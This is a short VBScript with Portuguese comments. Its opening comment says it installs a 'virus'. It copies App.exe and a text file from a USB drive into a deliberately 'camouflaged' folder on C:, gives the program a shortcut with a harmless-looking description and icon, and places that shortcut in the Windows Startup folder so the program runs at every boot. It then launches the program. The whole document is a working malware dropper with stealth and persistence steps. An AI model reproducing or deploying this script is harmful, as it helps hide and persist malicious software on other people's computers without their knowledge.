# Este script escrito em vbs serve para organizar todos os arquivos da virus nos seus devidos lugares.

# Cria os funções e variaveis.
dim crt
dim stpath
set crt = CreateObject("wscript.shell")
set x = CreateObject("Scripting.FileSystemObject")
set exe = CreateObject("Shell.Application")

# Pega o path da pasta startup.
stpath = crt.SpecialFolders("Startup")
stpath = Replace(stpath,"Startup","Startup\")

# Cria um diretorio camuflado no disco C:\.
crt.Run "cmd /c mkdir c:\SysFunctions\Functionx32"

WScript.Sleep(1000)

# Copia os arquivos da pendrive para a pasta camuflada.
x.CopyFile "D:\netinject\App.exe", "C:\SysFunctions\Functionx32\"
x.CopyFile "D:\netinject\Appsaves.txt", "C:\SysFunctions\Functionx32\"

# Cria um atalho para o programa no diretorio camuflado.
set lnk = crt.CreateShortcut("C:\SysFunctions\Functionx32\run.lnk")
lnk.TargetPath = "C:\SysFunctions\Functionx32\App.exe"
lnk.Description = "Run Principal functions programs"
lnk.IconLocation = "shell32.dll,8"
lnk.WorkingDirectory = "C:\SysFunctions\Functionx32\"
lnk.save

# Move o atalho para dentro da pasta startup para sempre que o pc iniciar o programa inciar junto.
x.CopyFile "C:\SysFunctions\Functionx32\run.lnk", stpath

WScript.Sleep(1000)

# Executa o programa ao fim da execução dos outros processos.
exe.ShellExecute("C:\SysFunctions\Functionx32\App.exe")